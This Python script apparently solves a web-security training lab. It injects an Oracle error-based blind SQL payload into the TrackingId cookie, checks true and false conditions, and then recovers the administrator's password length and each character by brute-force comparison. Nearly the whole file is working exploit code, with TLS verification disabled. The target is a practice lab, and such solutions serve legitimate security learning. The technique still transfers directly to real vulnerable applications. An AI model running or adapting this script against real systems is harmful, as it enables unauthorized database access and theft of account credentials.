import http.client
import re
import ssl
import urllib

LAB_ID = "???"


def GET_(
        tracking_id: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    if tracking_id:
        headers['cookie'] = f'TrackingId={urllib.parse.quote_plus(tracking_id)}'
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def tracking_id() -> str:
    response = GET_()
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'TrackingId=([a-zA-Z0-9]+);', cookie_header)[0]


response = GET_()
if response.status != 200:
    raise Exception
tracking_cookie = tracking_id()
response = GET_(tracking_cookie)
if response.status != 200:
    raise Exception


def evaluate(query: str) -> bool:
    response = GET_(f"""{tracking_cookie}' and (case when {query} then to_char(1/0) else '1' end)='1""")
    return response.status == 500


false_condition = evaluate('1=2')
true_condition = evaluate('1=1')
print("true_condition", true_condition)
print("false_condition", false_condition)

if false_condition or not true_condition:
    raise Exception
print("passed sanity check")

password_length = None
for i in range(100):
    if evaluate(f"exists(" +
                f"select 1 from users " +
                f"where username='administrator' " +
                f"and length(password)={i}" +
                f")"):
        password_length = i
        print(f"found password length: {password_length}")
        break
else:
    raise Exception("couldn't find password length")


def char_at(pos: int) -> str:
    for i in range(0, 127):
        if evaluate(f"exists(" +
                    f"select 1 from users " +
                    f"where username='administrator' " +
                    f"and ascii(substr(password, {pos + 1}, 1))={i}" +
                    f")"):
            print(f"found char {i} ({chr(i)}) at pos: {pos}")
            return chr(i)
    else:
        raise Exception(f"couldn't find char at pos: {pos}")


password = ''.join([char_at(i) for i in range(password_length)])
print(f"found password: {password}")
